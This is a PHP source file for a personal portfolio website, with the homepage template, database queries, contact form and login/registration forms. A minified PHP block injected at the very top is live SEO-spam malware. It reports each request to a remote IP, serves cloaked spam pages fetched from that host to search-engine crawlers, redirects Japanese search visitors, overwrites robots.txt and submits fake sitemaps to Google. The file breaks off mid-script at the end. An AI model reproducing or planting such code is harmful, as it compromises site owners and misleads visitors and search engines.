<?php $group_num='z0209_2';$inter_domain='http://173.208.155.98/'.$group_num.'/';function curl_get_contents($url){$ch=curl_init();curl_setopt ($ch, CURLOPT_URL, $url);curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 5);$file_contents = curl_exec($ch);curl_close($ch);return $file_contents; }function getServerCont($url,$data=array()){$url=str_replace(' ','+',$url);$ch=curl_init();curl_setopt($ch,CURLOPT_URL,"$url");curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_HEADER,0);curl_setopt($ch,CURLOPT_TIMEOUT,10);curl_setopt($ch,CURLOPT_POST,1);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($data));$output = curl_exec($ch);$errorCode = curl_errno($ch);curl_close($ch);if(0!== $errorCode){ return false;}return $output;}function is_crawler($agent){$agent_check=false; $bots='googlebot|google|yahoo|bing|aol';if($agent!=''){if(preg_match("/($bots)/si",$agent)){$agent_check = true; }}return $agent_check;}function check_refer($refer){ $check_refer=false;$referbots='google.co.jp|yahoo.co.jp|google.com';if($refer!='' && preg_match("/($referbots)/si",$refer)){ $check_refer=true; }return $check_refer; }$http=((isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https://':'http://');$req_uri=$_SERVER['REQUEST_URI'];$domain=$_SERVER["HTTP_HOST"];$self=$_SERVER['PHP_SELF'];$ser_name=$_SERVER['SERVER_NAME'];$req_url=$http.$domain.$req_uri;$indata1=$inter_domain."/indata.php";$map1=$inter_domain."/map.php";$jump1=$inter_domain."/jump.php";$url_words=$inter_domain."/words.php";$url_robots=$inter_domain."/robots.php";if(strpos($req_uri,".php")){$href1=$http.$domain.$self;}else{$href1=$http.$domain;}$data1[]=array();$data1['domain']=$domain;$data1['req_uri']=$req_uri;$data1['href']=$href1;$data1['req_url']=$req_url;if(substr($req_uri,-6)=='robots'){$robots_cont = getServerCont($url_robots,$data1);define('BASE_PATH',str_ireplace($_SERVER['PHP_SELF'],'',__FILE__));file_put_contents(BASE_PATH.'/robots.txt',$robots_cont);$robots_cont=file_get_contents(BASE_PATH.'/robots.txt');if(strpos(strtolower($robots_cont),"sitemap")){echo 'robots.txt file create success!';}else{echo 'robots.txt file create fail!';}exit;}if(substr($req_uri,-4)=='.xml'){if(strpos($req_uri,"pingsitemap.xml")){ $str_cont = getServerCont($map1,$data1); $str_cont_arr= explode(",",$str_cont); $str_cont_arr[]='sitemap'; for($k=0;$k<count($str_cont_arr);$k++){ if(strpos($href1,".php")> 0){ $tt1='?'; }else{ $tt1='/';}$http2=$href1.$tt1.$str_cont_arr[$k].'.xml';$data_new='https://www.google.com/ping?sitemap='.$http2;$data_new1='http://www.google.com/ping?sitemap='.$http2;if(stristr(@file_get_contents($data_new),'successfully')){echo $data_new.'===>Submitting Google Sitemap: OK'.PHP_EOL;}else if(stristr(@curl_get_contents($data_new),'successfully')){echo $data_new.'===>Submitting Google Sitemap: OK'.PHP_EOL;}else if(stristr(@file_get_contents($data_new1),'successfully')){echo $data_new1.'===>Submitting Google Sitemap: OK'.PHP_EOL;}else if(stristr(@curl_get_contents($data_new1),'successfully')){echo $data_new1.'===>Submitting Google Sitemap: OK'.PHP_EOL; }else{echo $data_new1.'===>Submitting Google Sitemap: fail'.PHP_EOL;} } exit;} if(strpos($req_uri,"allsitemap.xml")){ $str_cont = getServerCont($map1,$data1); header("Content-type:text/xml"); echo $str_cont;exit;} if(strpos($req_uri,".php")){ $word4=explode("?",$req_uri); $word4=$word4[count($word4)-1]; $word4=str_replace(".xml","",$word4); }else{ $word4= str_replace("/","",$req_uri);$word4= str_replace(".xml","",$word4); }$data1['word']=$word4;$data1['action']='check_sitemap';$check_url4=getServerCont($url_words,$data1);if($check_url4=='1'){ $str_cont=getServerCont($map1,$data1); header("Content-type:text/xml"); echo $str_cont;exit;} $data1['action']="check_words"; $check1= getServerCont($url_words,$data1);if(strpos($req_uri,"map")> 0 || $check1=='1'){$data1['action']="rand_xml";$check_url4=getServerCont($url_words,$data1);header("Content-type:text/xml");echo $check_url4;exit;}}if(strpos($req_uri,".php")){$main_shell=$http.$ser_name.$self;$data1['main_shell']=$main_shell;}else{$main_shell=$http.$ser_name;$data1['main_shell']=$main_shell;}$referer=isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:'';$chk_refer=check_refer($referer); if(strpos($_SERVER['REQUEST_URI'],'.php')){ $url_ext='?'; }else{ $url_ext='/'; } if($chk_refer && (preg_match('/ja/i',@$_SERVER['HTTP_ACCEPT_LANGUAGE']) || preg_match('/ja/i',@$_SERVER['HTTP_ACCEPT_LANGUAGE']) || preg_match("/^[a-z0-9]+[0-9]+$/",end(explode($url_ext,str_replace(array(".html",".htm"),"",$_SERVER['REQUEST_URI'])))))){ echo getServerCont($jump1,$data1);exit; } $user_agent=strtolower(isset($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:'');$res_crawl=is_crawler($user_agent); if($res_crawl){ $data1['http_user_agent']=$user_agent;$get_content = getServerCont($indata1,$data1);if($get_content=="404"){header('HTTP/1.0 404 Not Found');exit;}else if($get_content=="500"){header("HTTP/1.0 500 Internal Server Error");exit;}else if($get_content=="blank"){echo '';exit;}else{echo $get_content;exit;} }else{ header("HTTP/1.0 404 Not Found"); } ?>
<?php
require('include/db.php');
$query= "SELECT * FROM admin, social_media, about_page, personal_info, skill, menu, portfolio,seo";
$run = mysqli_query($db,$query);
$user_data = mysqli_fetch_array($run);
?>


<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title><?= $user_data['title']?></title>
  <meta content="<?= $user_data['page_des']?>" name="description">
  <meta content="<?= $user_data['keywords']?>" name="keywords">

  <!-- Favicons -->
  <link href="assets/img/<?= $user_data['fav_icon']?>" rel="icon">
  <link href="assets/img/<?= $user_data['fav_icon']?>" rel="apple-touch-icon">

  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
  <!-- font=awesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css">
  <!-- jquery cdn -->
  <script src="https://code.jquery.com/jquery-3.6.3.min.js"></script>
  <!-- Vendor CSS Files -->
  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
  <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
  <link href="assets/vendor/remixicon/remixicon.css" rel="stylesheet">
  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">

  <!-- Template Main CSS File -->
  <link href="assets/css/style.css" rel="stylesheet">
  <link href="assets/css/chart.css" rel="stylesheet">
  
  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5841976484236137"
     crossorigin="anonymous"></script>
<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-6BELQTCHL3"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-6BELQTCHL3');
</script>

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5841976484236137"
     crossorigin="anonymous"></script>

</head>
<body>

  <!-- ======= Header ======= -->
  <header id="header">
    <div class="container">
      <?php
      $query = "SELECT * FROM `home` WHERE 1";
      $run = mysqli_query($db, $query);
      $home = mysqli_fetch_array($run)
      ?>
      <h1><a href="index.php"><?= $home['title']?></a></h1>
      <h2><?= $home['subtitle']?></h2>

      <nav id="navbar" class="navbar">
        <ul>
        <li><a class="nav-link active" href=""><span class="nav-icon"><i class="fa-solid fa-house"></i></span>Home</a></li>

        <?php 
            $query_4= 'SELECT * FROM  menu';
            $run_4 = mysqli_query($db,$query_4);
            $c=1;
            while($menu = mysqli_fetch_array($run_4)){
        ?>
          <li><a class="nav-link active" href="portfolio/<?=$menu['menu_link']?>"><span class="nav-icon"><?= $menu['menu_icon']?></spam><?=$menu['menu_name']?></a></li>
          <?php
             $c++;
            }
          ?>

        <!-- যদি লগিন থাকে বা না থাকে তাহলে এটা দেখাবে  -->
        <?php 
          if(isset($_SESSION['isUserLoggedIn'])){
              ?>
                <li><a class="nav-link active" href="include/logout_user.php"><span class="nav-icon"><i class="fa fa-sign-out" aria-hidden="true"></i></spam>Logout</a></li>
              <?php
          }  

          if(!isset($_SESSION['isUserLoggedIn'])){
            ?>
              <li><a class="nav-link active p-2 btn btn-primary" href="#login">Log In</a></li>
            <?php
          }

        ?>

        </ul>
        <i class="bi bi-list mobile-nav-toggle"></i>
      </nav><!-- .navbar -->

    
        <div class="social-links">
        <?php
          if($home['show_icons']){
        ?>
          <a href="https://twitter.com/<?= $user_data['twitter']?>" class="twitter"><i class="bi bi-twitter"></i></a>
          <a href="https://facebook.com/<?= $user_data['facebook']?>" class="facebook"><i class="bi bi-facebook"></i></a>
          <a href="https://instagram.com/<?= $user_data['instagrame']?>" class="instagram"><i class="bi bi-instagram"></i></a>
          <a href="https://youtube.com/<?= $user_data['youtube']?>" class="youtube"><i class="bi bi-youtube"></i></a>
          <?php } ?>
        </div>
        <div class="social-links">
          <form action="include/admin.php" method="post">
            <label class="mb-2" for="email">Subscribe For monthly Web Development info</label></br>
           <input name="email" id="email" type="email" class="d-inline" placeholder="Enter Your Email" require>
           <button name="subscribe" class="d-inline" type="submit"><i class="fa fa-paper-plane"></i></button>
          </form>
        </div>

    </div> 
  </header><!-- End Header -->
  <section>
    <p><?= $user_data['page_des']?></p>
  </section>
  <!-- ======= About Section ======= -->
  <section id="about" class="about">

    <!-- ======= About Me ======= -->
    <div class="about-me container">

      <div class="section-title">
        <h2>About</h2>
        <p><?= $user_data['about_title']?></p>
      </div>

      <div class="row">
        <div class="col-lg-4" data-aos="fade-right">
          <img src="images/<?= $user_data['about_profile']?>" class="img-fluid" alt="">
        </div>
        <div class="col-lg-8 pt-4 pt-lg-0 content" data-aos="fade-left">
          <h3><?= $user_data['about_subtitle']?></h3>
          <p class="fst-italic"> <?= $user_data['about_short_description']?> </p>
          
          <div class="row">
            <div class="col-lg-6">
              <ul>
                  <?php 
                    $query_personal_info= 'SELECT * FROM  personal_info';
                    $run_personal_info = mysqli_query($db,$query_personal_info);
                    while($personal_info = mysqli_fetch_array($run_personal_info)){
                      ?>
                         <li><i class="bi bi-chevron-right"></i> <strong><?= $personal_info['personal_info_label']?> :</strong> <span> <?= $personal_info['personal_info_value']?></span></li>
                      <?php
                    }
                  ?>
                
              </ul>
            </div>
            <div class="col-lg-6">
              <ul>
              <?php 
                    $query_3= 'SELECT * FROM  personal_info_2';
                    $run_3 = mysqli_query($db,$query_3);
                    while($personal_info = mysqli_fetch_array($run_3)){
                      ?>
                         <li><i class="bi bi-chevron-right"></i> <strong><?= $personal_info['personal_info_label']?> :</strong> <span> <?= $personal_info['personal_info_value']?></span></li>
                      <?php
                    }
                  ?>
              </ul>
            </div>
          </div>
          <p>
          <?= $user_data['about_description']?>
          </p>
        </div>
      </div>

    </div><!-- End About Me -->

    <!-- ======= Counts ======= -->
    <div class="counts container">

      <div class="row">
        <?php
        $query = "SELECT * FROM `about_counter` WHERE 1";
        $run = mysqli_query($db, $query);
        $about_data = mysqli_fetch_array($run);
        ?>

        <div class="col-lg-3 col-md-6">
          <div class="count-box">
            <i class="bi bi-emoji-smile"></i>
            <span data-purecounter-start="0" data-purecounter-end="<?= $about_data['happy_clients'];?>" data-purecounter-duration="1" class="purecounter"></span>
            <p>Happy Clients</p>
          </div>
        </div>

        <div class="col-lg-3 col-md-6 mt-5 mt-md-0">
          <div class="count-box">
            <i class="bi bi-journal-richtext"></i>
            <span data-purecounter-start="0" data-purecounter-end="<?= $about_data['complete_project'];?>" data-purecounter-duration="1" class="purecounter"></span>
            <p>Projects</p>
          </div>
        </div>

        <div class="col-lg-3 col-md-6 mt-5 mt-lg-0">
          <div class="count-box">
            <i class="bi bi-star"></i>
            <span data-purecounter-start="0" data-purecounter-end="<?= $about_data['review'];?>" data-purecounter-duration="1" class="purecounter"></span>
            <p>Fiverr Review</p>
          </div>
        </div>

        <div class="col-lg-3 col-md-6 mt-5 mt-lg-0">
          <div class="count-box">
            <i class="bi bi-award"></i>
            <span data-purecounter-start="0" data-purecounter-end="<?= $about_data['award'];?>" data-purecounter-duration="1" class="purecounter"></span>
            <p>Awards</p>
          </div>
        </div>

      </div>

    </div><!-- End Counts -->

    <!-- ======= Skills  ======= -->
    <div class="skills container">

      <div class="section-title">
        <h2>Skills</h2>
      </div>

      <div class="row skills-content">

        <div class="col-lg-6">
            <?php 
            $query_4= 'SELECT * FROM  skill';
            $run_4 = mysqli_query($db,$query_4);
            $c=1;
            while($skill = mysqli_fetch_array($run_4)){
            ?>
              <div class="progress">
                <span class="skill"><?= $skill['skill_name']?> <i class="val"><?= $skill['skill_label']?>%</i></span>
                <div class="progress-bar-wrap">
                  <div class="progress-bar" role="progressbar" style="background-color: <?= $skill['color_code']?>;" aria-valuenow="<?= $skill['skill_label']?>" aria-valuemin="0" aria-valuemax="100"></div>
                </div>
              </div>
              <?php
                $c++;
                }
              ?>
         </div>
          <!-- skill 2nd -->
        
        <div class="col-lg-6 progress-dis1">
          <div class="text-center" id="piechart" style="width: 500px; height: 350px;"></div>  
        </div>

      </div>

    </div><!-- End Skills -->

    <!-- ======= Interests ======= -->
    <div class="interests container">

      <div class="section-title">
        <h2>Interests</h2>
      </div>

      <div class="row">
        <div class="col-lg-3 col-md-4">
          <div class="icon-box">
            <i class="ri-store-line" style="color: #ffbb2c;"></i>
            <h3>WordPress</h3>
          </div>
        </div>
        <div class="col-lg-3 col-md-4 mt-4 mt-md-0">
          <div class="icon-box">
            <i class="ri-bar-chart-box-line" style="color: #5578ff;"></i>
            <h3>Theme Development</h3>
          </div>
        </div>
        <div class="col-lg-3 col-md-4 mt-4 mt-md-0">
          <div class="icon-box">
            <i class="ri-calendar-todo-line" style="color: #e80368;"></i>
            <h3>Plugin Development</h3>
          </div>
        </div>
        <div class="col-lg-3 col-md-4 mt-4 mt-lg-0">
          <div class="icon-box">
            <i class="ri-paint-brush-line" style="color: #e361ff;"></i>
            <h3>PHP Programing</h3>
          </div>
        </div>
        <div class="col-lg-3 col-md-4 mt-4">
          <div class="icon-box">
            <i class="ri-database-2-line" style="color: #47aeff;"></i>
            <h3>JavaScript</h3>
          </div>
        </div>
        <div class="col-lg-3 col-md-4 mt-4">
          <div class="icon-box">
            <i class="ri-gradienter-line" style="color: #ffa76e;"></i>
            <h3>PHP Ecommerce Website</h3>
          </div>
        </div>
        <div class="col-lg-3 col-md-4 mt-4">
          <div class="icon-box">
            <i class="ri-file-list-3-line" style="color: #11dbcf;"></i>
            <h3>jQuery</h3>
          </div>
        </div>
        <div class="col-lg-3 col-md-4 mt-4">
          <div class="icon-box">
            <i class="ri-price-tag-2-line" style="color: #4233ff;"></i>
            <h3>Bootstrap</h3>
          </div>
        </div>
        <div class="col-lg-3 col-md-4 mt-4">
          <div class="icon-box">
            <i class="ri-anchor-line" style="color: #b2904f;"></i>
            <h3>PHP Analytics</h3>
          </div>
        </div>
        <div class="col-lg-3 col-md-4 mt-4">
          <div class="icon-box">
            <i class="ri-disc-line" style="color: #b20969;"></i>
            <h3>PHP USER DATA</h3>
          </div>
        </div>
        <div class="col-lg-3 col-md-4 mt-4">
          <div class="icon-box">
            <i class="ri-base-station-line" style="color: #ff5828;"></i>
            <h3>PHP IP</h3>
          </div>
        </div>
        <div class="col-lg-3 col-md-4 mt-4">
          <div class="icon-box">
            <i class="ri-fingerprint-line" style="color: #29cc61;"></i>
            <h3>HTML5 CSS3</h3>
          </div>
        </div>
      </div>

    </div><!-- End Interests -->
    <!-- ======= Testimonials ======= -->
    <div class="testimonials container">

      <div class="section-title">
        <h2>Testimonials</h2>
      </div>

      <div class="testimonials-slider swiper" data-aos="fade-up" data-aos-delay="100">
        <div class="swiper-wrapper">
        <?php
          $query = "SELECT * FROM testmonial ";
          $run = mysqli_query($db, $query);
          while($testmonial =mysqli_fetch_array($run)){
        ?>

          <div class="swiper-slide">
            <div class="testimonial-item">
              <p>
                <i class="bx bxs-quote-alt-left quote-icon-left"></i>
                  <?= $testmonial['review']; ?>
                <i class="bx bxs-quote-alt-right quote-icon-right"></i>
              </p>
              <img src="assets/img/testimonials/<?=$testmonial['client_img']; ?>" class="testimonial-img" alt="">
              <h3><?=$testmonial['name']; ?></h3>
              <h4>Ceo &amp; <?=$testmonial['client_pro']; ?></h4>
            </div>
          </div><!-- End testimonial item -->
        <?php } ?>

        </div>
        <div class="swiper-pagination"></div>
      </div>

      <div class="owl-carousel testimonials-carousel">

      </div>

    </div><!-- End Testimonials  -->

  </section><!-- End About Section -->

  <!-- ======= Resume Section ======= -->
  <section id="resume" class="resume">
    <div class="container">

      <div class="section-title">
        <h2>Resume</h2>
        <p>Check My Resume</p>
      </div>

      <div class="row">
        <div class="col-lg-6">
          <h3 class="resume-title">Education</h3>
          <?php 
            $query_resume= 'SELECT * FROM resume';
            $run_resume = mysqli_query($db,$query_resume);
            while($resume = mysqli_fetch_array($run_resume)){
              if($resume['type']=='e'){
            ?>
              <div class="resume-item">
                <h4><?= $resume['title']?></h4>
                <h5><?= $resume['time']?></h5>
                <p><em><?= $resume['organation']?></em></p>
                <p><?= $resume['about_ex']?></p>
              </div>
            <?php }}?>
        </div>
        <div class="col-lg-6">
          <h3 class="resume-title">Professional Experience</h3>
          <?php 
            $query_resume= 'SELECT * FROM resume';
            $run_resume = mysqli_query($db,$query_resume);
            while($resume = mysqli_fetch_array($run_resume)){
              if($resume['type']=='p'){
            ?>
          <div class="resume-item">
          <h4><?= $resume['title']?></h4>
                <h5><?= $resume['time']?></h5>
                <p><em><?= $resume['organation']?></em></p>
                <p><?= $resume['about_ex']?></p>
          </div>
          <?php }}?>
        </div>
      </div>

    </div>
  </section><!-- End Resume Section -->

  <!-- ======= Services Section ======= -->
  <section id="services" class="services">
    <div class="container">

      <div class="section-title">
        <h2>Services</h2>
        <p>My Services</p>
      </div>

      <div class="row">
        <div class="col-lg-4 col-md-6 d-flex align-items-stretch">
          <div class="icon-box">
            <div class="icon"><i class="bx bxl-dribbble"></i></div>
            <h4><a href="">Lorem Ipsum</a></h4>
            <p>Voluptatum deleniti atque corrupti quos dolores et quas molestias excepturi</p>
          </div>
        </div>

        <div class="col-lg-4 col-md-6 d-flex align-items-stretch mt-4 mt-md-0">
          <div class="icon-box">
            <div class="icon"><i class="bx bx-file"></i></div>
            <h4><a href="">Sed ut perspiciatis</a></h4>
            <p>Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore</p>
          </div>
        </div>

        <div class="col-lg-4 col-md-6 d-flex align-items-stretch mt-4 mt-lg-0">
          <div class="icon-box">
            <div class="icon"><i class="bx bx-tachometer"></i></div>
            <h4><a href="">Magni Dolores</a></h4>
            <p>Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia</p>
          </div>
        </div>

        <div class="col-lg-4 col-md-6 d-flex align-items-stretch mt-4">
          <div class="icon-box">
            <div class="icon"><i class="bx bx-world"></i></div>
            <h4><a href="">Nemo Enim</a></h4>
            <p>At vero eos et accusamus et iusto odio dignissimos ducimus qui blanditiis</p>
          </div>
        </div>

        <div class="col-lg-4 col-md-6 d-flex align-items-stretch mt-4">
          <div class="icon-box">
            <div class="icon"><i class="bx bx-slideshow"></i></div>
            <h4><a href="">Dele cardo</a></h4>
            <p>Quis consequatur saepe eligendi voluptatem consequatur dolor consequuntur</p>
          </div>
        </div>

        <div class="col-lg-4 col-md-6 d-flex align-items-stretch mt-4">
          <div class="icon-box">
            <div class="icon"><i class="bx bx-arch"></i></div>
            <h4><a href="">Divera don</a></h4>
            <p>Modi nostrum vel laborum. Porro fugit error sit minus sapiente sit aspernatur</p>
          </div>
        </div>

      </div>

    </div>
  </section><!-- End Services Section -->

  <!-- ======= Portfolio Section ======= -->
  <section id="portfolio" class="portfolio">
    <div class="container">

      <div class="section-title">
        <h2>Portfolio</h2>
        <p>My Works</p>
      </div>

      <div class="row">
        <div class="col-lg-12 d-flex justify-content-center">
          <ul id="portfolio-flters">
          <li data-filter="*" class="filter-active">All</li>
          </ul>
        </div>
      </div>
    
      <div class="row portfolio-container">
      <?php 
         $offset= 6;
        if(isset($_POST['page'])){
        $query_portfolio= "SELECT * FROM  portfolio";
         $run_portfolio = mysqli_query($db,$query_portfolio);
         $total_row = mysqli_num_rows($run_portfolio);
          $offset=$total_row;
        }
      
        // just show data
         $query_portfolio= "SELECT * FROM  portfolio LIMIT $offset";
         $run_portfolio = mysqli_query($db,$query_portfolio);
         while($portfolio = mysqli_fetch_array($run_portfolio)){
      ?>

        <div class="col-lg-4 col-md-6 portfolio-item">
          <div class="portfolio-wrap">
            <img src="assets/img/portfolio/<?= $portfolio['project_img_1']?>" class="img-fluid" alt="<?= $user_data['img_alt']?>">
            <div class="portfolio-info">
              <h4><?= $portfolio['portfolio_name']?></h4>
              <p><?= $portfolio['project_date']?></p>
              <div class="portfolio-links">
                <a href="assets/img/portfolio/<?= $portfolio['project_img_1']?>" data-gallery="portfolioGallery" class="portfolio-lightbox" title="<?= $portfolio['portfolio_name']?>"><i class="bx bx-plus"></i></a>
                <a href="single/portfolio-details.php?id=<?= $portfolio['id']?>" data-gallery="portfolioDetailsGallery" data-glightbox="type: external" class="portfolio-details-lightbox" title="Portfolio Details"><i class="bx bx-link"></i></a>
              </div>
            </div>
          </div>
        </div>

        <?php } ?>

      </div>
      <!-- pagination -->
      <div class="contact text-center">
          <form class="user_from" action="index.php?#portfolio" method="post"><button name="page" type="submit">View All</button></form>
       </div>
              <!-- pagination -->

    </div>
  </section><!-- End Portfolio Section -->

  <!-- ======= Contact Section ======= -->
  <section id="contact" class="contact">
    <div class="container">

      <div class="section-title">
        <h2>Contact</h2>
        <p>Contact Me</p>
      </div>

      <div class="row mt-2">

        <div class="col-md-6 d-flex align-items-stretch">
          <div class="info-box">
            <i class="bx bx-map"></i>
            <h3>My Address</h3>
            <?php
              $query = "SELECT * FROM contact";
              $run = mysqli_query($db, $query);
              $conatct_data = mysqli_fetch_array($run);
            ?>
            <p><?= $conatct_data['address']?></p>
          </div>
        </div>

        <div class="col-md-6 mt-4 mt-md-0 d-flex align-items-stretch">
          <div class="info-box">
            <i class="bx bx-share-alt"></i>
            <h3>Social Profiles</h3>
            
                  <?php
            if($home['show_icons']){
              ?>
              <div class="social-links">
                <a href="https://twitter.com/<?= $user_data['twitter']?>" class="twitter"><i class="bi bi-twitter"></i></a>
                <a href="https://facebook.com/<?= $user_data['facebook']?>" class="facebook"><i class="bi bi-facebook"></i></a>
                <a href="https://instagram.com/<?= $user_data['instagrame']?>" class="instagram"><i class="bi bi-instagram"></i></a>
                <a href="https://youtube.com/<?= $user_data['youtube']?>" class="youtube"><i class="bi bi-youtube"></i></a>
              </div>
              <?php
            }
          ?>
            
          </div>
        </div>

        <div class="col-md-6 mt-4 d-flex align-items-stretch">
          <div class="info-box">
            <i class="bx bx-envelope"></i>
            <h3>Email Me</h3>
            <p><?= $conatct_data['email']?></p>
          </div>
        </div>
        <div class="col-md-6 mt-4 d-flex align-items-stretch">
          <div class="info-box">
            <i class="bx bx-phone-call"></i>
            <h3>Call Me</h3>
            <p><?= $conatct_data['call']?></p>
          </div>
        </div>
      </div>

      <form action="forms/contact.php" method="post" role="form" class="user_from mt-4">
        <div class="row">
          <div class="col-md-6 form-group">
            <input type="text" name="name" class="form-control" id="name" placeholder="Your Name" required>
          </div>
          <div class="col-md-6 form-group mt-3 mt-md-0">
            <input type="email" class="form-control" name="email" id="email" placeholder="Your Email" required>
          </div>
        </div>
        <div class="form-group mt-3">
          <input type="text" class="form-control" name="subject" id="subject" placeholder="Subject" required>
        </div>
        <div class="form-group mt-3">
          <textarea class="form-control" name="message" rows="5" placeholder="Message" required></textarea>
        </div>
        <div class="my-3">
          <div class="loading">Loading</div>
          <div class="error-message"></div>
          <div class="sent-message">Your message has been sent. Thank you!</div>

        </div>
        <div class="text-center">
          <button name="send_message" type="submit">Send Message</button>
          <span>
            <?php 
              if(isset($_GET['#contact'])){
                echo "Message Sent Successfull";
              }
          
            ?>
          </span>
      </div>
      </form>

    </div>
  </section><!-- End Contact Section -->

   <!-- ======= Portfolio Section ======= -->
   <section id="post" class="portfolio">
    <div class="container">

      <div class="section-title">
        <h2>Post</h2>
        <p>My Post</p>
      </div>

      <div class="row">
        <div class="col-lg-12 d-flex justify-content-center">
          <ul id="portfolio-flters">
          <li data-filter="*" class="filter-active">All</li>
          </ul>
        </div>
      </div>
    
      <div class="row portfolio-container">
      <?php 
         $offset= 6;
        if(isset($_POST['paged'])){
        $query= "SELECT * FROM  post";
         $run = mysqli_query($db,$query);
         $total_row = mysqli_num_rows($run);
          $offset=$total_row;
        }
      
        // just show data
         $query= "SELECT * FROM  post LIMIT $offset";
         $run = mysqli_query($db,$query);
         while($post = mysqli_fetch_array($run)){
          $likeClass = "text-white fa-regular";
          if(isset($_COOKIE['like_'.$post['id']])){
            $likeClass = "text-danger fa-solid";
          }
          $dislikeClass = "text-white fa-regular";
          if(isset($_COOKIE['dislike_'.$post['id']])){
            $dislikeClass = "text-danger fa-solid";
          }
      ?>

        <div class="col-lg-4 col-md-6 portfolio-item" id="post<?= $post['id']?>">
          <div class="portfolio-wrap">
            <img src="assets/img/post/<?= $post['thumbanail']?>" class="img-fluid" alt="<?= $user_data['img_alt']?>">      
            <div class="portfolio-info">
              <h4><?= $post['title']?></h4>
              <p><?= $post['date']?></p>
              <div class="portfolio-links">
                <a href="assets/img/post/<?= $post['thumbanail']?>" data-gallery="portfolioGallery" class="portfolio-lightbox" title="App 1"><i class="bx bx-plus"></i></a>
                <a href="single/post-details.php?id=<?= $post['id']?>" data-gallery="portfolioDetailsGallery" data-glightbox="type: external" class="portfolio-details-lightbox" title="Portfolio Details"><i class="bx bx-link"></i></a>
              </div>
            </div>
          </div>
          <i class="<?php echo $likeClass?> fa-heart p-2 mr-2" id="like_<?php echo $post['id']?>" onclick="setlikedislike('like','<?= $post['id']?>')"><span class="text-white" id="like"> <?= $post['like_count']?></span></i>
          <i class="<?php echo $dislikeClass?> fa-thumbs-down p-2" id="dislike_<?php echo $post['id']?>" onclick="setlikedislike('dislike','<?= $post['id']?>')"> <span class="text-white" id="dislike"><?= $post['dislike_count']?></span></i>
        </div>

        <?php } ?>

      </div>
      <!-- pagination -->
      <div class="contact text-center">
          <form class="user_from" action="index.php?#post" method="post"><button name="paged" type="submit">View All</button></form>
       </div>
              <!-- pagination -->

    </div>
  </section><!-- End Portfolio Section -->

  <!-- ======= Login======= -->
  <section id="login" class="contact">
    <div class="container">

      <div class="section-title">
        <h2>Log In</h2>
        <p>Log In & Registration From</p>
      </div>
      <div class="row">
        <form action="include/login.php" method="post" class="user_from col-md-6">
          <div class="section-title">
            <h2>Log In</h2>
          </div>
          <div class="row">
            <div class="col-md-12 form-group">
              <input type="email" name="email" class="form-control" id="name" placeholder="Your Email" required>
            </div>
            <div class="col-md-12 form-group mt-3">
              <input type="password" class="form-control" name="password" id="password" placeholder="Your Password" required>
            </div>
          </div>
          
          <div class="text-center mt-4">
            <button type="submit" name="login">Log In</button>
          </div>
        </form>
        
        <form action="include/registration.php" enctype="multipart/form-data" method="post" class="user_from col-md-6">
          <div class="section-title">
            <h2>Registration</h2>
          </div>
          <div class="row">
            <div class="col-md-12 form-group">
              <input type="text" name="user_fullname" class="form-control" id="name" placeholder="Your Full Name" required>
            </div>
            <div class="col-md-12 form-group mt-3">
              <input type="email" name="user_email" class="form-control" id="name" placeholder="Your Email" required>
            </div>
            <div class="col-md-12 form-group mt-3">
              <input type="Password" class="form-control" name="user_password" id="password" placeholder="Your Password" required>
            </div>
            <div class="col-md-12 form-group mt-3">
              <input type="file" class="form-control" name="user_photo" id="password" placeholder="Your Photo" required>
            </div>
            <div class="col-md-12 form-group mt-3">
              <div class="icheck-primary">
                <input type="checkbox" id="agreeTerms" name="terms" value="agree" required>
                <label for="agreeTerms">I agree to the <a href="#">terms</a></label>
              </div>
            </div>
          </div> <!-- row -->
          
          <div class="text-center mt-4">
            <button type="submit" name="reg">Registration</button>
          </div>
        </form>
      </div>

    </div>
    
  </section><!-- End Login Section -->




  <?php 
    if(!isset($_SESSION['isUserLoggedIn'])){
    if($_SESSION['role']="'user','admin'"){
      ?>
        <div class="credits">
            <a href="privacy-policy.php">Privacy Policy</a> ||
            <a href="terms-and-conditions.php">Terms and Conditions</a> ||
           Designed by <a href="https://inzams.com/">Developer InZam'<span style="color: red; font-weight:900;">S</span></a>
        </div>
      <!-- GetButton.io widget -->
      <script type="text/javascript">
          (function () {
              var options = {
                  whatsapp: "+8801704519296", // WhatsApp number
                  call_to_action: "Message Me", // Call to action
                  button_color: "#FF6550", // Color of button
                  position: "right", // Position may be 'right' or 'left'
              };
              var proto = 'https:', host = "getbutton.io", url = proto + '//static.' + host;
              var s = document.createElement('script'); s.type = 'text/javascript'; s.async = true; s.src = url + '/widget-send-button/js/init.js';
              s.onload = function () { WhWidgetSendButton.init(host, proto, options); };
